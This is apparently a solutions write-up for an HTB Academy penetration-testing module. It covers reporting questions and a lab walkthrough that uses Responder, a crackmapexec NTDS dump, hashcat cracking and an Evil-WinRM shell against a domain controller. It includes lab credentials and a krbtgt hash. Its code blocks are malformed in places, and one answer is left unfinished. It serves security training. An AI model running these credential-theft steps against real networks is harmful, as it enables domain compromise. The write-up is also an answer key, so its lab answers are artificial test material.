# Notetaking & Organization

## Question 1

### "What tool mentioned in this section can make logging a session easier?"

The `Tmux` tool can make logging a session easier.

Answer: `Tmux`

# Notetaking & Organization

## Question 2

### "Steve is learning about the tool that can make logging a session easier. He messages you for help mentioning that he would like to try to split the panes vertically. What do you tell him? (Answer format: \[key\] + \[key\] + \[key\], i.e., fill in the values for "key" and leave the brackets and + signs.)"

To split the panes vertically, Steve needs to type the key combinations `[Ctrl] + [B] + [Shift] + [%]`:

![[HTB Solutions/CPTS/z. images/e3890ed7fd1d9a2b02a19d07e01b738d_MD5.jpg]]

Answer: `[Ctrl] + [B] + [Shift] + [%]`

# Types of Reports

## Question 1

### "Inlanefreight has contracted Elizabeth's firm to complete a type of assessment that is mostly automated where no exploitation is attempted. What kind of assessment is she going to be contracted for?"

Elizabeth will be contracted for a `Vulnerability Assessment`:

![[HTB Solutions/CPTS/z. images/0f9fa5c27eb659e841a6b5e1307d6b0d_MD5.jpg]]

Answer: `Vulnerability Assessment`

# Types of Reports

## Question 2

### "Nicolas is performing an external & internal penetration test for Inlanefreight. The client has only provided the company's name and a network connection onsite at their office and no additional detail. From what perspective is he performing the penetration test?"

Nicolas is performing the penetration test from a `Black Box` perspective:

![[HTB Solutions/CPTS/z. images/2b317992701f78cc399050ff6c56b589_MD5.jpg]]

Answer: `Black Box`

# Components of a Report

## Question 1

### "What component of a report should be written in a simple to understand and non-technical manner?"

The `Executive Summary` should be written in a simple to understand and non-technical manner:

![[HTB Solutions/CPTS/z. images/62c29ddea1611b6681cbb5d9a9c6e8c7_MD5.jpg]]

Answer: `Executive Summary`

# Components of a Report

## Question 2

### "It is a good practice to name and recommend specific vendors in the component of the report mentioned in the last question. True or False?"

`False`; it is not a good practice to name and recommend specific vendors in Executive Summaries:

![[HTB Solutions/CPTS/z. images/15851a5e09f943c39f0eb94c4fa3a8bb_MD5.jpg]]

Answer: `False`

# How to Write Up a Finding

## Question 1

### ""An attacker can own your whole entire network cause your DC is way out of date. You should really fix that!". Is this a Good or Bad remediation recommendation? (Answer Format: Good or Bad)"

`Bad`; this is an example of a bad remediation recommendation; it does not mention to the reader what exactly is vulnerable/dangerous about the DC, nor does it explain the consequences of having a not updated DC, thus, it requires the reader to research about it.

Answer: `Bad`

# Documentation & Reporting Practice Lab

## Question 1

### "Connect to the testing VM using Xfreerdp and practice testing, documentation, and reporting against the target lab. Once the target spawns, browse to the WriteHat instance on port 443 and authenticate with the provided admin credentials. Play around with the tool and practice adding findings to the database to get a feel for the reporting tools available to us. Remember that all data will be lost once the target resets, so save any practice findings locally! Next, complete the in-progress penetration test. Once you achieve Domain Admin level access, submit the contents of the flag.txt file on the Administrator Desktop on the DC01 host."

After spawning the target machine, students need to connect to it using `xfreerdp` with the credentials `htb-student:HTB_@cademy_stdnt!`:

Code: shell

```shell
xfreerdp /v:STMIP /u:htb-student /p:HTB_@cademy_stdnt!
```

```

Once the connection is successfully established, students need to open `Obsidian` and read the notes taken by the previous pentester under the "Evidence" Vault. Poking around all the files, students will discover four credential pairs:

- `dhawkins:Bacon1989`

![[HTB Solutions/CPTS/z. images/328376f98509e448748b889089643f22_MD5.jpg]]

- `Administrator:Welcome123!`:

![[HTB Solutions/CPTS/z. images/b0758b2df6a6f32116460d9bbd9e3c08_MD5.jpg]]

- `asmith:Welcome1` and `abouldercon:Welcome1`:

![[HTB Solutions/CPTS/z. images/4dff2aea082abf7633ea2ed921e8cb48_MD5.jpg]]

Students will also find IP addresses of other Windows targets, which are:

- `DC`: `172.16.5.5`
- `DEV01`: `172.16.5.200`
- `FILE01`: `172.16.5.130`

Additionally, students will also find some partial output from `Responder` under "H3 - LLMNR&NBT-NS Response Spoofing":

![[HTB Solutions/CPTS/z. images/1f605c87129b06f9b2d90189c26d4135_MD5.jpg]]

From the Parrot instance that students have connected to, they need to start `Responder` and wait until they receive the hash for `hackupagent`:

Code: shell

```shell
sudo responder -I ens224 -wrvf
```

```

## Question 2

### "After achieving Domain Admin, submit the NTLM hash of the KRBTGT account."

Using the same RDP connection from question 1, students need to use `crackmapexec` to dump NTDS on the DC, utilizing the credentials `backupagent:Recovery7`:

Code: shell

```shell
sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds
```

```

The hash of the `krbtgt` account `16e26ba33e455a8c338142af8d89ffbc` will be among the first ones displayed by `crackmapexec`. Alternatively, students can use `grep` on the log files of `crackmapexec` under `/root/.cme/logs`:

Code: shell

```shell
grep "krbtgt" /root/.cme/logs/DC01_172.16.5.5_2022-08-18_023751.ntds

# Documentation & Reporting Practice Lab

## Question 3

### "Dump the NTDS file and perform offline password cracking. Submit the password of the svc\_reporting user as your answer."

Using the same RDP connection from Question 1, students need to use `crackmapexec` to dump NTDS on the DC, using the credentials `backupagent:Recovery7`:

Code: shell

```shell
sudo crackmapexec smb 172.16.5.5 -u backupagent -p Recovery7 --ntds | tee hashes.txt SMB
```

```

Subsequently, students need to use `grep` on the log file of `crackmapexec` to filter for the account `svc_reporting`:

```shell
grep "svc_reporting" /root/.cme/logs/DC01_172.16.5.5_2022-08-18_023751.ntds

At last, students need to crack the hash using `hashcat`:

```shell
hashcat -w 3 -O -m 1000 "a6d3701ae426329951cf5214b7531140" /usr/share/wordlists/rockyou.txt
```
```

└──╼ $hashcat -w 3 -O -m 1000 "a6d3701ae426329951cf5214b7531140" /usr/share/wordlists/rockyou.txt

hashcat (v6.2.5-275-gc1df53b47) starting

<SNIP>

a6d3701ae426329951cf5214b7531140:Reporter1!
```

The plaintext of the cracked password hash is `Reporter1!`.

Answer: `Reporter1!`

## Question 4

### "What powerful local group does this user belong to?"

Using the same RDP connection from question 1, students need to connect to the DC using `Evil-WinRM` with the credentials `backupagent:Recovery7`:

```shell
evil-winrm -i 172.16.5.5 -u backupagent -p Recovery7
```
```
┌─[htb-student@par01]─[~]
└──╼ $evil-winrm -i 172.16.5.5 -u backupagent -p Recovery7

Evil-WinRM shell v3.3

Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine

Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\backupagent\Documents> 
```

Then, students need to issue the command `net user svc_reporting`, to find out that the user `svc_reporting` belongs to the powerful `Backup Operators` local group:

```shell
net user svc_reporting
```
```
*Evil-WinRM* PS C:\Users\backupagent\Documents> net user svc_reporting
User name                    svc_reporting
Full Name

<SNIP>

Local Group Memberships      *Backup Operators
Global Group memberships     *Domain Users
The command completed successfully.
```

Answer: `Backup Operators`
